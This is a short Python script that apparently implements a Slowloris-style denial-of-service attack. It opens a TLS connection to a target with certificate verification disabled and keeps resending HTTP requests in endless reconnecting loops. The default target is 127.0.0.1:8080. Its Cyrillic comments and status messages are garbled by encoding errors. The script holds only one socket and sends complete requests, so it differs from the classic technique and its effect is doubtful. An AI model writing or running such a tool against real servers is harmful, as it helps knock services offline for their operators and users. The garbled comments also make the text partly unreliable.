# -*- coding: windows-1251 -*-
import socket
import time
import ssl

def slowloris(target_ip, target_port):
    request = (
        "GET / HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        "Connection: keep-alive\r\n"
        "User-Agent: Slowloris\r\n"
        "Accept: text/html\r\n\r\n"
    )

    while True:  # ����������� ���� �����
        try:
            print(f"[+] ����������� � {target_ip}:{target_port}")

            # ������� �����
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(5)  # ������������� ������� �� �����������

            try:
                client.connect((target_ip, target_port))
            except (socket.timeout, ConnectionRefusedError) as e:
                print(f"[!] ������ ������ �����������: {e}")
                time.sleep(10)  # ����������� �������� ����� ��������� ��������
                continue

            # ������� SSL-��������
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            # ����������� ����� � SSL
            client = context.wrap_socket(client, server_hostname=target_ip)

            print("[+] ���������� �����������, �������� �������� ������...")

            while True:
                try:
                    client.send(request.encode('utf-8'))
                    print("[>] ����� ���������")
                    time.sleep(10)  # ��������� �����

                except (ssl.SSLError, socket.error) as e:
                    print(f"[!] ������ ��� �������� ������: {e}")
                    break  # ��������� ������� ������ � �������� ������

        except Exception as e:
            print(f"[!] ����� ������: {e}")

        finally:
            print("[*] �������� ����������, ������� ���������������...")
            try:
                client.close()
            except:
                pass
            time.sleep(5)  # ����� ����� ����� ������������

# ��������� Slowloris
slowloris("127.0.0.1", 8080)
